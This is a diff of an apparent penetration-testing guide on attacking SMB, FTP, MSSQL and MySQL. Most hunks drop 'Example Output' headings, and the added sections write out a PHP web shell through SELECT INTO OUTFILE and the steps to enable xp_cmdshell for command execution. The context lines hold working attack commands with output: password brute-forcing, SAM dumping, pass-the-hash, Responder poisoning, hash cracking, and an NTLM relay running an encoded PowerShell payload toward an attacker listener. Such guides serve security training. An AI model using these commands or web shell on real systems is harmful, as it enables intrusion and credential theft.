@@ -75,9 +75,6 @@ The command dir displays a list of a directory's files and subdirectories.
 ```cmd
 dir  \\<IP>\<SHARE_NAME>
 ```
-
-**Example Output:**
-
 ```cmd
 C:\tom> dir \\192.168.220.129\Finance\
 
@@ -127,9 +124,6 @@ dir n: /a-d /s /b | find /c ":\"
 ```powershell
 Get-ChildItem \\<IP>\<SHARE_NAME>
 ```
-
-**Example Output:**
-
 ```powershell
 # PS C:\tom> Get-ChildItem \\192.168.220.129\Finance\
 
@@ -160,9 +154,6 @@ $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\<IP>\<SHARE_NAME>" -PSProvider "FileSystem" -Credential $cred
 ```
-
-**Example Output:**
-
 ```powershell
 # Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
 # ----           ---------     --------- --------      ----                                               ---------------
@@ -632,9 +623,6 @@ If read/write permissions are **not** configured correctly:
 ```bash
 ftp <TARGET_IP> <PORT>
 ```
-
-**Example Output**
-
 ```bash
 # Connected to <TARGET_IP>.
 # 220 (vsFTPd 2.3.4)
@@ -663,9 +651,6 @@ ftp <TARGET_IP> <PORT>
 ```bash
 medusa -u <USER_LIST> -P <PASSWORD_LIST> -h <TARGET_IP> -M ftp -n <PORT>
 ```
-
-**Example Output**
-
 ```bash
 # Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
 # ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
@@ -697,9 +682,6 @@ This is achieved by manipulating the `PORT` command to make the FTP server conne
 ```bash
 nmap -Pn -v -n -p80 -b <USER>:<PASSWORD>@<ATTACKER_IP> <TARGET_IP>
 ```
-
-**Example Output**
-
 ```bash
 # Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
 # Resolved FTP bounce attack proxy to <ATTACKER_IP> (<ATTACKER_IP>).
@@ -765,9 +747,6 @@ When scanning, SMB on **port 445** indicates direct TCP usage, while **port 139*
 ```bash
 sudo nmap <TARGET_IP> -sV -sC -p139,445
 ```
-
-**Example Output**
-
 ```bash
 # PORT    STATE SERVICE     VERSION
 # 139/tcp open  netbios-ssn Samba smbd 4.6.2
@@ -832,9 +811,6 @@ SMB servers can allow access without requiring a username and password (null ses
 ```bash
 smbclient -N -L //<TARGET_IP>
 ```
-
-**Example Output:**
-
 ```bash
 # Sharename       Type      Comment
 # -------         --        -------
@@ -852,9 +828,6 @@ smbclient -N -L //<TARGET_IP>
 ```bash
 smbmap -H <TARGET_IP>
 ```
-
-**Example Output:**
-
 ```bash
 # [+] IP: <TARGET_IP>:445
 # Disk       Permissions   Comment
@@ -870,9 +843,6 @@ smbmap -H <TARGET_IP>
 ```bash
 smbmap -H <TARGET_IP> -r <SHARE_NAME>
 ```
-
-**Example Output:**
-
 ```bash
 # [+] Guest session       IP: <TARGET_IP>:445    Name: <TARGET_IP>                           
 #         Disk                                                    Permissions     Comment
@@ -897,9 +867,6 @@ From the above example, the permissions are set to READ and WRITE, which one can
 ```bash
 smbmap -H <TARGET_IP> --download "notes\note.txt"
 ```
-
-**Example Output:**
-
 ```bash
 # [+] Starting download: notes\note.txt (116 bytes)
 # [+] File output to: /rth/<TARGET_IP>-notes_note.txt
@@ -910,9 +877,6 @@ smbmap -H <TARGET_IP> --download "notes\note.txt"
 ```bash
 smbmap -H <TARGET_IP> --upload ./test.txt "notes\test.txt"
 ```
-
-**Example Output:**
-
 ```bash
 # [+] Starting upload: test.txt (20 bytes)
 # [+] Upload complete.
@@ -930,9 +894,6 @@ RPC can be enumerated using a **null session** with `rpcclient` or automated too
 ```bash
 rpcclient -U'%' <TARGET_IP>
 ```
-
-**Example Output:**
-
 ```bash
 rpcclient $> enumdomusers
 
@@ -950,9 +911,6 @@ rpcclient $> enumdomusers
 ```bash
 ./enum4linux-ng.py <TARGET_IP> -A -C
 ```
-
-**Example Output:**
-
 ```bash
 # ENUM4LINUX - next generation
 
@@ -1013,9 +971,6 @@ If a null session is not enabled, we will need credentials to interact with the 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER_LIST> -p '<PASSWORD>' --local-auth
 ```
-
-**Example Output:**
-
 ```bash
 # SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 # SMB         <TARGET_IP> 445    WIN7BOX  [-] WIN7BOX\Administrator:<PASSWORD> STATUS_LOGON_FAILURE 
@@ -1042,9 +997,6 @@ To use impacket-psexec, we need to provide the domain/username, the password, an
 ```bash
 impacket-psexec <USER>:'<PASSWORD>'@<TARGET_IP>
 ```
-
-**Example Output:**
-
 ```bash
 # Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1071,9 +1023,6 @@ C:\Windows\system32>
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
 ```
-
-**Example Output:**
-
 ```bash
 # SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
 # SMB         <TARGET_IP> 445    WIN7BOX  [+] .\<USER>:<PASSWORD> (Pwn3d!)
@@ -1095,9 +1044,6 @@ Imagine we are in a network with multiple machines. Some of them share the same 
 ```bash
 crackmapexec smb 10.10.110.0/24 -u <USER> -p '<PASSWORD>' --local-auth --logged-on-users
 ```
-
-**Example Output:**
-
 ```bash
 # SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 # SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
@@ -1126,9 +1072,6 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam
 ```
-
-**Example Output:**
-
 ```bash
 # SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 # SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
@@ -1154,9 +1097,6 @@ If we manage to get an **NTLM hash** of a user, and if we cannot crack it, we ca
 ```bash
 crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
 ```
-
-**Example Output:**
-
 ```bash
 # SMB         <TARGET_IP> 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 # SMB         <TARGET_IP> 445    WIN7BOX  [+] WIN7BOX\<USER>:<NTLM_HASH> (Pwn3d!)
@@ -1219,9 +1159,6 @@ flowchart TD
 ```bash
 sudo responder -I ens3
 ```
-
-**Expected Output:**
-
 ```bash
 #   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
 #   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -1244,9 +1181,6 @@ sudo responder -I ens3
 
 # ...
 ```
-
-**Example output when credentials are captured:**
-
 ```bash
 # [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Domain Master Browser)
 # [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Browser Election)
@@ -1269,9 +1203,6 @@ All saved Hashes are located in Responder's logs directory (**`/usr/share/respon
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-**Expected Output:**
-
 ```bash
 # hashcat (v6.1.1) starting...
 
@@ -1304,9 +1235,6 @@ sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
 ```bash
 cat /etc/responder/Responder.conf | grep 'SMB ='
 ```
-
-**Expected Output:**
-
 ```bash
 # SMB = Off
 ```
@@ -1321,9 +1249,6 @@ Set the local IP, port, and generate the encoded command.
 ```bash
 nc -lvnp <PORT>
 ```
-
-**Expected Output:**
-
 ```bash
 # listening on [any] 9001 ...
 ```
@@ -1333,9 +1258,6 @@ nc -lvnp <PORT>
 ```bash
 impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <BASE64_STRING>'
 ```
-
-**Expected Output:**
-
 ```bash
 # listening on [any] 9001 ...
 # connect to [10.10.110.133] from (UNKNOWN) [<TARGET_IP>] 52471
@@ -1397,9 +1319,6 @@ Database services are frequently configured with highly privileged users. If an 
 ```bash
 sudo nmap <TARGET_IP> -Pn -sV -sC -p1433
 ```
-
-**Example Output**
-
 ```bash
 # PORT     STATE SERVICE  VERSION
 # 1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
@@ -1545,9 +1464,6 @@ mysql -u <USER> -p<PASSWORD> -h <TARGET_IP>
 ```sql
 SHOW DATABASES;
 ```
-
-**Example Output**
-
 ```bash
 # +--------------------+
 # | Database           |
@@ -1563,9 +1479,6 @@ SHOW DATABASES;
 ```sql
 USE users;
 ```
-
-**Example Output**
-
 ```bash
 # Database changed
 ```
@@ -1575,9 +1488,6 @@ USE users;
 ```sql
 SHOW TABLES;
 ```
-
-**Example Output**
-
 ```bash
 # +----------------------------+
 # | users                      |
@@ -1599,7 +1509,6 @@ SHOW TABLES;
 ```sql
 SELECT * FROM users;
 ```
-
 ```bash
 # +----+---------------+------------+---------------------+
 # | id | username      | password   | date_of_joining     |
@@ -1610,6 +1519,23 @@ SELECT * FROM users;
 # |  4 | tom           | tom123!    | 2025-07-02 12:23:16 |
 # +----+---------------+------------+---------------------+
 # 4 rows in set (0.00 sec)
+```
+
+</details>
+
+<details>
+<summary><h4>Step 3: Execute Commands</h4></summary>
+
+Command execution is one of the most valuable capabilities when attacking common services, as it enables direct control over the operating system. With sufficient privileges, an attacker can leverage the SQL database to run system commands or create the necessary mechanisms to do so.
+
+Unlike SQL Server’s `xp_cmdshell`, **MySQL** does not provide a built-in stored procedure for executing system commands. However, command execution is still possible if we can write files to a location on the file system that is executed by another service.
+
+For example, if **MySQL** is running alongside a PHP-based web server (or another language such as ASP.NET), and we have the necessary privileges, we can create a web shell using **SELECT INTO OUTFILE**. By writing a script directly into the web server’s directory, we are then able to browse to the file and execute arbitrary commands through the web interface.
+
+**Write Local File**
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
 </details>
@@ -1668,9 +1594,6 @@ mssqlclient.py -p <PORT> <USER>@<TARGET_IP>
 SELECT name FROM master.dbo.sysdatabases;
 GO
 ```
-
-**Example Output**
-
 ```bash
 # master
 # tempdb
@@ -1685,9 +1608,6 @@ GO
 USE users;
 GO
 ```
-
-**Example Output**
-
 ```bash
 # Changed database context to 'users'.
 ```
@@ -1698,9 +1618,6 @@ GO
 SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES;
 GO
 ```
-
-**Example Output**
-
 ```bash
 # actions
 # permissions
@@ -1718,7 +1635,6 @@ GO
 SELECT * FROM users;
 GO
 ```
-
 ```bash
 # id   username       password       date_of_joining
 # ----------------------------------------------------------
@@ -1726,6 +1642,57 @@ GO
 # 2    administrator  adm1n_p@ss     2025-07-02 11:30:50
 # 3    john           john123!       2025-07-02 11:47:16
 # 4    tom            tom123!        2025-07-02 12:23:16
+```
+
+</details>
+
+<details>
+<summary><h4>Step 3: Execute Commands</h4></summary>
+
+Command execution is one of the most valuable capabilities when attacking common services, as it enables direct control over the operating system. With sufficient privileges, an attacker can leverage the SQL database to run system commands or create the necessary mechanisms to do so.
+
+**Execute commands using SQL syntax on MSSQL**
+
+```sql
+xp_cmdshell 'whoami'
+GO
+```
+```bash
+# output
+# -----------------------------
+# no service\mssql$sqlexpress
+# NULL
+# (2 rows affected)
+```
+
+If xp_cmdshell is not enabled, we can enable it.
+
+**Allow advanced options to be changed:**
+
+```sql
+EXECUTE sp_configure 'show advanced options', 1
+GO
+```
+
+**Update the currently configured value for advanced options:**
+
+```sql
+RECONFIGURE
+GO
+```
+
+**Enable the feature:**
+
+```sql
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO  
+```
+
+**Update the currently configured value for this feature:**
+
+```sql
+RECONFIGURE
+GO
 ```
 
 </details>
